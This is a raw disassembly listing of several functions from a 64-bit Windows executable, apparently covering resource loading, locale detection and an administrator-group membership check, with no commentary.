   14000488a:	48 8b f1             	mov    %rcx,%rsi
   14000488d:	44 8b c3             	mov    %ebx,%r8d
   140004890:	ff 15 92 0c 02 00    	call   *0x20c92(%rip)        # 0x140025528
   140004896:	85 c0                	test   %eax,%eax
   140004898:	0f 84 77 01 00 00    	je     0x140004a15
   14000489e:	48 8d 15 fb 1a 02 00 	lea    0x21afb(%rip),%rdx        # 0x1400263a0
   1400048a5:	48 8d 4d 07          	lea    0x7(%rbp),%rcx
   1400048a9:	ff 15 61 09 02 00    	call   *0x20961(%rip)        # 0x140025210
   1400048af:	85 c0                	test   %eax,%eax
   1400048b1:	0f 85 5e 01 00 00    	jne    0x140004a15
   1400048b7:	8d 53 b0             	lea    -0x50(%rbx),%edx
   1400048ba:	48 8b ce             	mov    %rsi,%rcx
   1400048bd:	ff 15 6d 0c 02 00    	call   *0x20c6d(%rip)        # 0x140025530
   1400048c3:	a8 0e                	test   $0xe,%al
   1400048c5:	0f 84 4a 01 00 00    	je     0x140004a15
   1400048cb:	48 8b ce             	mov    %rsi,%rcx
   1400048ce:	ff 15 64 0c 02 00    	call   *0x20c64(%rip)        # 0x140025538
   1400048d4:	4c 8d 45 77          	lea    0x77(%rbp),%r8
   1400048d8:	48 8d 0d b9 1a 02 00 	lea    0x21ab9(%rip),%rcx        # 0x140026398
   1400048df:	48 8b d0             	mov    %rax,%rdx
   1400048e2:	e8 75 fc ff ff       	call   0x14000455c
   1400048e7:	4c 8b e0             	mov    %rax,%r12
   1400048ea:	48 85 c0             	test   %rax,%rax
   1400048ed:	0f 84 22 01 00 00    	je     0x140004a15
   1400048f3:	48 83 7d 77 10       	cmpq   $0x10,0x77(%rbp)
   1400048f8:	0f 82 17 01 00 00    	jb     0x140004a15
   1400048fe:	48 8b 55 77          	mov    0x77(%rbp),%rdx
   140004902:	8b cb                	mov    %ebx,%ecx
   140004904:	ff 15 0e 09 02 00    	call   *0x2090e(%rip)        # 0x140025218
   14000490a:	48 8b d8             	mov    %rax,%rbx
   14000490d:	48 85 c0             	test   %rax,%rax
   140004910:	0f 84 ff 00 00 00    	je     0x140004a15
   140004916:	4c 8b 45 77          	mov    0x77(%rbp),%r8
   14000491a:	49 8b d4             	mov    %r12,%rdx
   14000491d:	48 8b c8             	mov    %rax,%rcx
   140004920:	e8 07 f5 01 00       	call   0x140023e2c
   140004925:	33 c9                	xor    %ecx,%ecx
   140004927:	ff 15 2b 0e 02 00    	call   *0x20e2b(%rip)        # 0x140025758
   14000492d:	4c 8d 45 7f          	lea    0x7f(%rbp),%r8
   140004931:	33 d2                	xor    %edx,%edx
   140004933:	48 8b cb             	mov    %rbx,%rcx
   140004936:	ff 15 14 0e 02 00    	call   *0x20e14(%rip)        # 0x140025750
   14000493c:	85 c0                	test   %eax,%eax
   14000493e:	0f 85 c8 00 00 00    	jne    0x140004a0c
   140004944:	48 8b 4d 7f          	mov    0x7f(%rbp),%rcx
   140004948:	48 85 c9             	test   %rcx,%rcx
   14000494b:	0f 84 bb 00 00 00    	je     0x140004a0c
   140004951:	48 8d 45 d7          	lea    -0x29(%rbp),%rax
   140004955:	4c 8d 0d 54 40 02 00 	lea    0x24054(%rip),%r9        # 0x1400289b0
   14000495c:	45 33 c0             	xor    %r8d,%r8d
   14000495f:	33 d2                	xor    %edx,%edx
   140004961:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004966:	ff 15 54 0a 02 00    	call   *0x20a54(%rip)        # 0x1400253c0
   14000496c:	48 8b 4d 7f          	mov    0x7f(%rbp),%rcx
   140004970:	48 8b 01             	mov    (%rcx),%rax
   140004973:	ff 50 10             	call   *0x10(%rax)
   140004976:	48 8b cb             	mov    %rbx,%rcx
   140004979:	ff 15 a1 08 02 00    	call   *0x208a1(%rip)        # 0x140025220
   14000497f:	48 8b 4d d7          	mov    -0x29(%rbp),%rcx
   140004983:	48 85 c9             	test   %rcx,%rcx
   140004986:	0f 84 89 00 00 00    	je     0x140004a15
   14000498c:	48 83 65 6f 00       	andq   $0x0,0x6f(%rbp)
   140004991:	48 8b 01             	mov    (%rcx),%rax
   140004994:	48 8d 55 6f          	lea    0x6f(%rbp),%rdx
   140004998:	ff 50 18             	call   *0x18(%rax)
   14000499b:	48 8b 4d 6f          	mov    0x6f(%rbp),%rcx
   14000499f:	48 85 c9             	test   %rcx,%rcx
   1400049a2:	74 57                	je     0x1400049fb
   1400049a4:	e8 f3 fc ff ff       	call   0x14000469c
   1400049a9:	4c 8d 45 df          	lea    -0x21(%rbp),%r8
   1400049ad:	ba 20 00 00 00       	mov    $0x20,%edx
   1400049b2:	48 8b c8             	mov    %rax,%rcx
   1400049b5:	48 89 45 6f          	mov    %rax,0x6f(%rbp)
   1400049b9:	ff 15 c1 06 02 00    	call   *0x206c1(%rip)        # 0x140025080
   1400049bf:	8b 45 e7             	mov    -0x19(%rbp),%eax
   1400049c2:	c7 44 24 30 06 00 00 	movl   $0x6,0x30(%rsp)
   1400049c9:	00 
   1400049ca:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400049ce:	8b 45 e3             	mov    -0x1d(%rbp),%eax
   1400049d1:	45 33 c9             	xor    %r9d,%r9d
   1400049d4:	45 33 c0             	xor    %r8d,%r8d
   1400049d7:	33 d2                	xor    %edx,%edx
   1400049d9:	48 8b ce             	mov    %rsi,%rcx
   1400049dc:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400049e0:	ff 15 9a 0b 02 00    	call   *0x20b9a(%rip)        # 0x140025580
   1400049e6:	4c 8b 4d 6f          	mov    0x6f(%rbp),%r9
   1400049ea:	45 33 c0             	xor    %r8d,%r8d
   1400049ed:	ba 72 01 00 00       	mov    $0x172,%edx
   1400049f2:	48 8b ce             	mov    %rsi,%rcx
   1400049f5:	ff 15 b5 0b 02 00    	call   *0x20bb5(%rip)        # 0x1400255b0
   1400049fb:	48 8b 4d d7          	mov    -0x29(%rbp),%rcx
   1400049ff:	48 8b 01             	mov    (%rcx),%rax
   140004a02:	ff 50 10             	call   *0x10(%rax)
   140004a05:	b8 01 00 00 00       	mov    $0x1,%eax
   140004a0a:	eb 0b                	jmp    0x140004a17
   140004a0c:	48 8b cb             	mov    %rbx,%rcx
   140004a0f:	ff 15 0b 08 02 00    	call   *0x2080b(%rip)        # 0x140025220
   140004a15:	33 c0                	xor    %eax,%eax
   140004a17:	48 8b 9c 24 d0 00 00 	mov    0xd0(%rsp),%rbx
   140004a1e:	00 
   140004a1f:	48 81 c4 b0 00 00 00 	add    $0xb0,%rsp
   140004a26:	41 5c                	pop    %r12
   140004a28:	5e                   	pop    %rsi
   140004a29:	5d                   	pop    %rbp
   140004a2a:	c3                   	ret
   140004a2b:	cc                   	int3
   140004a2c:	48 83 ec 28          	sub    $0x28,%rsp
   140004a30:	0f b7 15 b1 80 02 00 	movzwl 0x280b1(%rip),%edx        # 0x14002cae8
   140004a37:	66 85 d2             	test   %dx,%dx
   140004a3a:	75 5c                	jne    0x140004a98
   140004a3c:	ff 15 b6 07 02 00    	call   *0x207b6(%rip)        # 0x1400251f8
   140004a42:	ba ff 03 00 00       	mov    $0x3ff,%edx
   140004a47:	0f b7 c8             	movzwl %ax,%ecx
   140004a4a:	66 89 05 97 80 02 00 	mov    %ax,0x28097(%rip)        # 0x14002cae8
   140004a51:	66 23 ca             	and    %dx,%cx
   140004a54:	66 83 f9 09          	cmp    $0x9,%cx
   140004a58:	74 05                	je     0x140004a5f
   140004a5a:	0f b7 c0             	movzwl %ax,%eax
   140004a5d:	eb 3c                	jmp    0x140004a9b
   140004a5f:	ff 15 9b 07 02 00    	call   *0x2079b(%rip)        # 0x140025200
   140004a65:	b9 09 04 00 00       	mov    $0x409,%ecx
   140004a6a:	66 3b c1             	cmp    %cx,%ax
   140004a6d:	75 22                	jne    0x140004a91
   140004a6f:	ff 15 93 07 02 00    	call   *0x20793(%rip)        # 0x140025208
   140004a75:	8b 0d 0d 27 02 00    	mov    0x2270d(%rip),%ecx        # 0x140027188
   140004a7b:	0f b7 15 66 80 02 00 	movzwl 0x28066(%rip),%edx        # 0x14002cae8
   140004a82:	3b c1                	cmp    %ecx,%eax
   140004a84:	66 0f 44 d1          	cmove  %cx,%dx
   140004a88:	66 89 15 59 80 02 00 	mov    %dx,0x28059(%rip)        # 0x14002cae8
   140004a8f:	eb 07                	jmp    0x140004a98
   140004a91:	0f b7 15 50 80 02 00 	movzwl 0x28050(%rip),%edx        # 0x14002cae8
   140004a98:	0f b7 c2             	movzwl %dx,%eax
   140004a9b:	48 83 c4 28          	add    $0x28,%rsp
   140004a9f:	c3                   	ret
   140004aa0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004aa5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004aaa:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004aaf:	57                   	push   %rdi
   140004ab0:	41 54                	push   %r12
   140004ab2:	41 57                	push   %r15
   140004ab4:	48 81 ec d0 00 00 00 	sub    $0xd0,%rsp
   140004abb:	33 d2                	xor    %edx,%edx
   140004abd:	45 33 c0             	xor    %r8d,%r8d
   140004ac0:	8b f9                	mov    %ecx,%edi
   140004ac2:	39 15 c8 76 02 00    	cmp    %edx,0x276c8(%rip)        # 0x14002c190
   140004ac8:	4c 8d 25 c1 76 02 00 	lea    0x276c1(%rip),%r12        # 0x14002c190
   140004acf:	74 1b                	je     0x140004aec
   140004ad1:	49 8b c4             	mov    %r12,%rax
   140004ad4:	39 08                	cmp    %ecx,(%rax)
   140004ad6:	74 14                	je     0x140004aec
   140004ad8:	49 ff c0             	inc    %r8
   140004adb:	ff c2                	inc    %edx
   140004add:	49 8b c0             	mov    %r8,%rax
   140004ae0:	48 c1 e0 05          	shl    $0x5,%rax
   140004ae4:	49 03 c4             	add    %r12,%rax
   140004ae7:	83 38 00             	cmpl   $0x0,(%rax)
   140004aea:	75 e8                	jne    0x140004ad4
   140004aec:	8b da                	mov    %edx,%ebx
   140004aee:	48 c1 e3 05          	shl    $0x5,%rbx
   140004af2:	42 83 3c 23 00       	cmpl   $0x0,(%rbx,%r12,1)
   140004af7:	75 0c                	jne    0x140004b05
   140004af9:	48 8d 05 c0 15 02 00 	lea    0x215c0(%rip),%rax        # 0x1400260c0
   140004b00:	e9 7d 01 00 00       	jmp    0x140004c82
   140004b05:	ff 15 6d 08 02 00    	call   *0x2086d(%rip)        # 0x140025378
   140004b0b:	48 8d 15 96 18 02 00 	lea    0x21896(%rip),%rdx        # 0x1400263a8
   140004b12:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004b17:	44 8b c7             	mov    %edi,%r8d
   140004b1a:	8b e8                	mov    %eax,%ebp
   140004b1c:	ff 15 a6 0a 02 00    	call   *0x20aa6(%rip)        # 0x1400255c8
   140004b22:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004b27:	45 33 c0             	xor    %r8d,%r8d
   140004b2a:	33 d2                	xor    %edx,%edx
   140004b2c:	ff 15 a6 06 02 00    	call   *0x206a6(%rip)        # 0x1400251d8
   140004b32:	8b f0                	mov    %eax,%esi
   140004b34:	ff 15 3e 08 02 00    	call   *0x2083e(%rip)        # 0x140025378
   140004b3a:	49 83 cf ff          	or     $0xffffffffffffffff,%r15
   140004b3e:	85 c0                	test   %eax,%eax
   140004b40:	75 69                	jne    0x140004bab
   140004b42:	8d 56 02             	lea    0x2(%rsi),%edx
   140004b45:	41 8d 47 03          	lea    0x3(%r15),%eax
   140004b49:	48 f7 e2             	mul    %rdx
   140004b4c:	49 0f 40 c7          	cmovo  %r15,%rax
   140004b50:	48 8b c8             	mov    %rax,%rcx
   140004b53:	e8 22 f2 01 00       	call   0x140023d7a
   140004b58:	44 8d 46 01          	lea    0x1(%rsi),%r8d
   140004b5c:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004b61:	48 8b d0             	mov    %rax,%rdx
   140004b64:	48 8b f8             	mov    %rax,%rdi
   140004b67:	ff 15 6b 06 02 00    	call   *0x2066b(%rip)        # 0x1400251d8
   140004b6d:	3b c6                	cmp    %esi,%eax
   140004b6f:	77 32                	ja     0x140004ba3
   140004b71:	ff 15 01 08 02 00    	call   *0x20801(%rip)        # 0x140025378
   140004b77:	85 c0                	test   %eax,%eax
   140004b79:	75 28                	jne    0x140004ba3
   140004b7b:	4a 8b 4c 23 18       	mov    0x18(%rbx,%r12,1),%rcx
   140004b80:	48 85 c9             	test   %rcx,%rcx
   140004b83:	74 17                	je     0x140004b9c
   140004b85:	48 8b d7             	mov    %rdi,%rdx
   140004b88:	ff 15 52 06 02 00    	call   *0x20652(%rip)        # 0x1400251e0
   140004b8e:	85 c0                	test   %eax,%eax
   140004b90:	74 11                	je     0x140004ba3
   140004b92:	4a 8b 4c 23 18       	mov    0x18(%rbx,%r12,1),%rcx
   140004b97:	e8 d2 f1 01 00       	call   0x140023d6e
   140004b9c:	4a 89 7c 23 18       	mov    %rdi,0x18(%rbx,%r12,1)
   140004ba1:	eb 08                	jmp    0x140004bab
   140004ba3:	48 8b cf             	mov    %rdi,%rcx
   140004ba6:	e8 c3 f1 01 00       	call   0x140023d6e
   140004bab:	8b cd                	mov    %ebp,%ecx
   140004bad:	ff 15 45 07 02 00    	call   *0x20745(%rip)        # 0x1400252f8
   140004bb3:	4a 8b 44 23 18       	mov    0x18(%rbx,%r12,1),%rax
   140004bb8:	48 85 c0             	test   %rax,%rax
   140004bbb:	0f 85 c1 00 00 00    	jne    0x140004c82
   140004bc1:	4a 8b 7c 23 08       	mov    0x8(%rbx,%r12,1),%rdi
   140004bc6:	4a 39 44 23 10       	cmp    %rax,0x10(%rbx,%r12,1)
   140004bcb:	74 12                	je     0x140004bdf
   140004bcd:	e8 5a fe ff ff       	call   0x140004a2c
   140004bd2:	3b 05 b0 25 02 00    	cmp    0x225b0(%rip),%eax        # 0x140027188
   140004bd8:	75 05                	jne    0x140004bdf
   140004bda:	4a 8b 7c 23 10       	mov    0x10(%rbx,%r12,1),%rdi
   140004bdf:	48 8b cf             	mov    %rdi,%rcx
   140004be2:	ff 15 b8 06 02 00    	call   *0x206b8(%rip)        # 0x1400252a0
   140004be8:	8b f0                	mov    %eax,%esi
   140004bea:	8d 48 03             	lea    0x3(%rax),%ecx
   140004bed:	b8 02 00 00 00       	mov    $0x2,%eax
   140004bf2:	48 63 d1             	movslq %ecx,%rdx
   140004bf5:	48 f7 e2             	mul    %rdx
   140004bf8:	49 0f 40 c7          	cmovo  %r15,%rax
   140004bfc:	48 8b c8             	mov    %rax,%rcx
   140004bff:	e8 76 f1 01 00       	call   0x140023d7a
   140004c04:	8b 0d 0a 75 02 00    	mov    0x2750a(%rip),%ecx        # 0x14002c114
   140004c0a:	4a 89 44 23 18       	mov    %rax,0x18(%rbx,%r12,1)
   140004c0f:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140004c12:	75 49                	jne    0x140004c5d
   140004c14:	0f b7 0d cd 7e 02 00 	movzwl 0x27ecd(%rip),%ecx        # 0x14002cae8
   140004c1b:	83 25 f2 74 02 00 00 	andl   $0x0,0x274f2(%rip)        # 0x14002c114
   140004c22:	4c 8d 84 24 90 00 00 	lea    0x90(%rsp),%r8
   140004c29:	00 
   140004c2a:	41 b9 1f 00 00 00    	mov    $0x1f,%r9d
   140004c30:	ba 04 10 00 00       	mov    $0x1004,%edx
   140004c35:	ff 15 ad 05 02 00    	call   *0x205ad(%rip)        # 0x1400251e8
   140004c3b:	85 c0                	test   %eax,%eax
   140004c3d:	7e 18                	jle    0x140004c57
   140004c3f:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
   140004c46:	00 
   140004c47:	ff 15 d3 09 02 00    	call   *0x209d3(%rip)        # 0x140025620
   140004c4d:	8b c8                	mov    %eax,%ecx
   140004c4f:	89 05 bf 74 02 00    	mov    %eax,0x274bf(%rip)        # 0x14002c114
   140004c55:	eb 06                	jmp    0x140004c5d
   140004c57:	8b 0d b7 74 02 00    	mov    0x274b7(%rip),%ecx        # 0x14002c114
   140004c5d:	8d 46 02             	lea    0x2(%rsi),%eax
   140004c60:	44 8d 4e 01          	lea    0x1(%rsi),%r9d
   140004c64:	4c 8b c7             	mov    %rdi,%r8
   140004c67:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140004c6b:	4a 8b 44 23 18       	mov    0x18(%rbx,%r12,1),%rax
   140004c70:	33 d2                	xor    %edx,%edx
   140004c72:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004c77:	ff 15 73 05 02 00    	call   *0x20573(%rip)        # 0x1400251f0
   140004c7d:	4a 8b 44 23 18       	mov    0x18(%rbx,%r12,1),%rax
   140004c82:	4c 8d 9c 24 d0 00 00 	lea    0xd0(%rsp),%r11
   140004c89:	00 
   140004c8a:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140004c8e:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   140004c92:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140004c96:	49 8b e3             	mov    %r11,%rsp
   140004c99:	41 5f                	pop    %r15
   140004c9b:	41 5c                	pop    %r12
   140004c9d:	5f                   	pop    %rdi
   140004c9e:	c3                   	ret
   140004c9f:	cc                   	int3
   140004ca0:	40 53                	rex push %rbx
   140004ca2:	48 83 ec 20          	sub    $0x20,%rsp
   140004ca6:	83 3d e3 74 02 00 00 	cmpl   $0x0,0x274e3(%rip)        # 0x14002c190
   140004cad:	74 22                	je     0x140004cd1
   140004caf:	48 8d 1d f2 74 02 00 	lea    0x274f2(%rip),%rbx        # 0x14002c1a8
   140004cb6:	48 8b 0b             	mov    (%rbx),%rcx
   140004cb9:	48 85 c9             	test   %rcx,%rcx
   140004cbc:	74 09                	je     0x140004cc7
   140004cbe:	e8 ab f0 01 00       	call   0x140023d6e
   140004cc3:	48 83 23 00          	andq   $0x0,(%rbx)
   140004cc7:	48 83 c3 20          	add    $0x20,%rbx
   140004ccb:	83 7b e8 00          	cmpl   $0x0,-0x18(%rbx)
   140004ccf:	75 e5                	jne    0x140004cb6
   140004cd1:	48 83 c4 20          	add    $0x20,%rsp
   140004cd5:	5b                   	pop    %rbx
   140004cd6:	c3                   	ret
   140004cd7:	cc                   	int3
   140004cd8:	48 83 ec 58          	sub    $0x58,%rsp
   140004cdc:	48 8b 0d 55 7e 02 00 	mov    0x27e55(%rip),%rcx        # 0x14002cb38
   140004ce3:	48 8d 15 d6 16 02 00 	lea    0x216d6(%rip),%rdx        # 0x1400263c0
   140004cea:	ff 15 60 05 02 00    	call   *0x20560(%rip)        # 0x140025250
   140004cf0:	48 85 c0             	test   %rax,%rax
   140004cf3:	74 0c                	je     0x140004d01
   140004cf5:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004cfa:	ff d0                	call   *%rax
   140004cfc:	0f b7 44 24 20       	movzwl 0x20(%rsp),%eax
   140004d01:	48 83 c4 58          	add    $0x58,%rsp
   140004d05:	c3                   	ret
   140004d06:	cc                   	int3
   140004d07:	cc                   	int3
   140004d08:	48 83 ec 28          	sub    $0x28,%rsp
   140004d0c:	e8 c7 ff ff ff       	call   0x140004cd8
   140004d11:	83 f8 09             	cmp    $0x9,%eax
   140004d14:	48 8d 05 c5 16 02 00 	lea    0x216c5(%rip),%rax        # 0x1400263e0
   140004d1b:	75 07                	jne    0x140004d24
   140004d1d:	48 8d 05 b4 16 02 00 	lea    0x216b4(%rip),%rax        # 0x1400263d8
   140004d24:	48 83 c4 28          	add    $0x28,%rsp
   140004d28:	c3                   	ret
   140004d29:	cc                   	int3
   140004d2a:	cc                   	int3
   140004d2b:	cc                   	int3
   140004d2c:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140004d31:	55                   	push   %rbp
   140004d32:	48 8b ec             	mov    %rsp,%rbp
   140004d35:	48 83 ec 60          	sub    $0x60,%rsp
   140004d39:	33 db                	xor    %ebx,%ebx
   140004d3b:	48 8d 45 20          	lea    0x20(%rbp),%rax
   140004d3f:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140004d43:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140004d48:	89 5c 24 48          	mov    %ebx,0x48(%rsp)
   140004d4c:	89 5c 24 40          	mov    %ebx,0x40(%rsp)
   140004d50:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   140004d54:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140004d58:	44 8d 43 20          	lea    0x20(%rbx),%r8d
   140004d5c:	41 b9 20 02 00 00    	mov    $0x220,%r9d
   140004d62:	b2 02                	mov    $0x2,%dl
   140004d64:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140004d68:	89 5d 10             	mov    %ebx,0x10(%rbp)
   140004d6b:	48 89 5d 20          	mov    %rbx,0x20(%rbp)
   140004d6f:	89 5d 18             	mov    %ebx,0x18(%rbp)
   140004d72:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140004d76:	66 c7 45 1c 00 05    	movw   $0x500,0x1c(%rbp)
   140004d7c:	ff 15 86 02 02 00    	call   *0x20286(%rip)        # 0x140025008
   140004d82:	85 c0                	test   %eax,%eax
   140004d84:	74 1d                	je     0x140004da3
   140004d86:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140004d8a:	4c 8d 45 10          	lea    0x10(%rbp),%r8
   140004d8e:	33 c9                	xor    %ecx,%ecx
   140004d90:	ff 15 7a 02 02 00    	call   *0x2027a(%rip)        # 0x140025010
   140004d96:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140004d9a:	ff 15 60 02 02 00    	call   *0x20260(%rip)        # 0x140025000
   140004da0:	8b 45 10             	mov    0x10(%rbp),%eax
   140004da3:	48 8b 9c 24 88 00 00 	mov    0x88(%rsp),%rbx
   140004daa:	00 
   140004dab:	48 83 c4 60          	add    $0x60,%rsp
   140004daf:	5d                   	pop    %rbp
   140004db0:	c3                   	ret
   140004db1:	cc                   	int3
   140004db2:	cc                   	int3
   140004db3:	cc                   	int3
   140004db4:	48 8b c4             	mov    %rsp,%rax
   140004db7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004dbb:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140004dbf:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140004dc3:	4c 89 60 20          	mov    %r12,0x20(%rax)
   140004dc7:	55                   	push   %rbp
   140004dc8:	48 8d 68 a1          	lea    -0x5f(%rax),%rbp
   140004dcc:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   140004dd3:	48 8b f2             	mov    %rdx,%rsi
   140004dd6:	44 8b e1             	mov    %ecx,%r12d
   140004dd9:	48 8d 15 70 79 02 00 	lea    0x27970(%rip),%rdx        # 0x14002c750
   140004de0:	49 8b c8             	mov    %r8,%rcx
   140004de3:	49 8b d9             	mov    %r9,%rbx
   140004de6:	49 8b f8             	mov    %r8,%rdi
   140004de9:	e8 de 40 01 00       	call   0x140018ecc
   140004dee:	48 8d 15 73 79 02 00 	lea    0x27973(%rip),%rdx        # 0x14002c768
   140004df5:	48 8b cb             	mov    %rbx,%rcx
   140004df8:	e8 cf 40 01 00       	call   0x140018ecc
   140004dfd:	8b 57 08             	mov    0x8(%rdi),%edx
   140004e00:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   140004e04:	ff ca                	dec    %edx
   140004e06:	4c 8b c7             	mov    %rdi,%r8
   140004e09:	e8 ca 3f 01 00       	call   0x140018dd8
   140004e0e:	48 8b 55 d7          	mov    -0x29(%rbp),%rdx
   140004e12:	48 8b cf             	mov    %rdi,%rcx
   140004e15:	e8 b2 40 01 00       	call   0x140018ecc
   140004e1a:	48 8b 4d d7          	mov    -0x29(%rbp),%rcx
   140004e1e:	e8 4b ef 01 00       	call   0x140023d6e
   140004e23:	8b 53 08             	mov    0x8(%rbx),%edx
   140004e26:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   140004e2a:	ff ca                	dec    %edx
   140004e2c:	4c 8b c3             	mov    %rbx,%r8
   140004e2f:	e8 a4 3f 01 00       	call   0x140018dd8
   140004e34:	48 8b 55 d7          	mov    -0x29(%rbp),%rdx
   140004e38:	48 8b cb             	mov    %rbx,%rcx
   140004e3b:	e8 8c 40 01 00       	call   0x140018ecc
   140004e40:	48 8b 4d d7          	mov    -0x29(%rbp),%rcx
   140004e44:	e8 25 ef 01 00       	call   0x140023d6e
   140004e49:	48 85 f6             	test   %rsi,%rsi
   140004e4c:	74 31                	je     0x140004e7f
   140004e4e:	80 3e 00             	cmpb   $0x0,(%rsi)
   140004e51:	74 2c                	je     0x140004e7f
   140004e53:	48 8d 15 a6 15 02 00 	lea    0x215a6(%rip),%rdx        # 0x140026400
   140004e5a:	48 8d 4d e7          	lea    -0x19(%rbp),%rcx
   140004e5e:	4c 8b c6             	mov    %rsi,%r8
   140004e61:	ff 15 b9 06 02 00    	call   *0x206b9(%rip)        # 0x140025520
   140004e67:	48 8d 55 e7          	lea    -0x19(%rbp),%rdx
   140004e6b:	48 8b cf             	mov    %rdi,%rcx
   140004e6e:	e8 45 41 01 00       	call   0x140018fb8
   140004e73:	48 8d 55 e7          	lea    -0x19(%rbp),%rdx
   140004e77:	48 8b cb             	mov    %rbx,%rcx
   140004e7a:	e8 39 41 01 00       	call   0x140018fb8
   140004e7f:	45 85 e4             	test   %r12d,%r12d
   140004e82:	74 2c                	je     0x140004eb0
   140004e84:	48 8d 15 65 15 02 00 	lea    0x21565(%rip),%rdx        # 0x1400263f0
   140004e8b:	48 8d 4d e7          	lea    -0x19(%rbp),%rcx
   140004e8f:	45 8b c4             	mov    %r12d,%r8d
   140004e92:	ff 15 88 06 02 00    	call   *0x20688(%rip)        # 0x140025520
   140004e98:	48 8d 55 e7          	lea    -0x19(%rbp),%rdx
   140004e9c:	48 8b cf             	mov    %rdi,%rcx
   140004e9f:	e8 14 41 01 00       	call   0x140018fb8
   140004ea4:	48 8d 55 e7          	lea    -0x19(%rbp),%rdx
   140004ea8:	48 8b cb             	mov    %rbx,%rcx
   140004eab:	e8 08 41 01 00       	call   0x140018fb8
   140004eb0:	48 8d 15 31 15 02 00 	lea    0x21531(%rip),%rdx        # 0x1400263e8
   140004eb7:	48 8b cf             	mov    %rdi,%rcx
   140004eba:	e8 f9 40 01 00       	call   0x140018fb8
   140004ebf:	48 8d 15 22 15 02 00 	lea    0x21522(%rip),%rdx        # 0x1400263e8
   140004ec6:	48 8b cb             	mov    %rbx,%rcx
   140004ec9:	e8 ea 40 01 00       	call   0x140018fb8
   140004ece:	4c 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%r11
   140004ed5:	00 
   140004ed6:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140004eda:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140004ede:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140004ee2:	4d 8b 63 28          	mov    0x28(%r11),%r12
   140004ee6:	49 8b e3             	mov    %r11,%rsp
   140004ee9:	5d                   	pop    %rbp
   140004eea:	c3                   	ret
